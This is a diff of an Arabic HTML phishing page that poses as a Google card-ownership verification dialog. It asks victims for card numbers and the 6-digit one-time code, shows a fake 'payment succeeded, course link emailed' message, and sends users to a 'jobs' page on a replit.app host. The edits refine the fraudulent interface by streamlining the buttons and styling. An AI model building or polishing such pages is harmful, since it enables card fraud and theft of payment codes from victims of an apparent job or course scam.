@@ -71,7 +71,6 @@
 
         .google-footer-btns { display: flex; gap: 12px; flex-direction: row-reverse; }
         .btn-blue { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
-        .btn-outline { background: white; color: #1a73e8; border: 1px solid #dadce0; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; }
 
         /* باقي التنسيقات الأصلية */
         header { text-align: center; margin-bottom: 30px; }
@@ -94,7 +93,7 @@
                 <h2>إثبات ملكية بطاقتك</h2>
                 <button class="close-btn"><i class="fa-solid fa-xmark"></i></button>
             </div>
-            <p class="verification-desc">اتَّبع التعليمات أدناه لإثبات ملكية بطاقتك وإجراء عمليات دفع.</p>
+            <p class="verification-desc">اتَّبع التعليمات أدناه لإثبات ملكية بطاقتك وإجراء عمليات دفع.</p>
             <div class="step-item">1. ستتحصل شركة Google على رسوم مؤقتة من بطاقتك.</div>
             <div class="step-item">2. لإثبات ملكية البطاقة، يُرجى إدخال الرمز المؤلف من 6 أرقام والظاهر بجانب المبلغ في حسابك.</div>
             
@@ -109,8 +108,7 @@
             <div class="otp-input-wrapper">
                 <input type="text" id="google-otp-input" class="google-input" placeholder="أدخل الرمز" maxlength="6">
                 <div class="google-footer-btns">
-                    <button id="confirm-google-btn" class="btn-blue">الحصول على الرمز</button>
-                    <button class="btn-outline">إثبات الملكية بطريقة أخرى</button>
+                    <button id="confirm-google-btn" class="btn-blue">إثبات الملكية</button>
                 </div>
             </div>
         </div>
@@ -157,14 +155,14 @@
             <i class="fa-solid fa-circle-check"></i>
             <h2>تم الدفع بنجاح!</h2>
             <p>سيصلك رابط الدورة على بريدك الإلكتروني.</p>
-            <button class="btn-outline" onclick="window.location.href='https://pasted-assets--tdaff.replit.app/'" style="margin-top: 20px; width: 100%">الرجوع للوظائف</button>
+            <button class="btn-blue" onclick="window.location.href='https://pasted-assets--tdaff.replit.app/'" style="margin-top: 20px; width: 100%; border: none; padding: 10px; border-radius: 4px; color: white; cursor: pointer;">الرجوع للوظائف</button>
         </div>
 
         <div class="payment-status error" id="error-message">
             <i class="fa-solid fa-circle-xmark"></i>
             <h2>فشلت العملية</h2>
             <p>يرجى التحقق من البيانات والمحاولة مرة أخرى.</p>
-            <button class="btn-blue" onclick="location.reload()" style="margin-top: 20px; width: 100%">تحديث الصفحة</button>
+            <button class="btn-blue" onclick="location.reload()" style="margin-top: 20px; width: 100%; border: none; padding: 10px; border-radius: 4px; color: white; cursor: pointer;">تحديث الصفحة</button>
         </div>
     </div>
 
@@ -187,7 +185,6 @@
     let currentDocId = null;
     let selectedCardType = 'visa';
 
-    // التنسيق والتعرف التلقائي
     document.getElementById('card-number').addEventListener('input', (e) => {
         let val = e.target.value.replace(/\D/g, '');
         if (val.startsWith('4')) selectedCardType = 'visa';
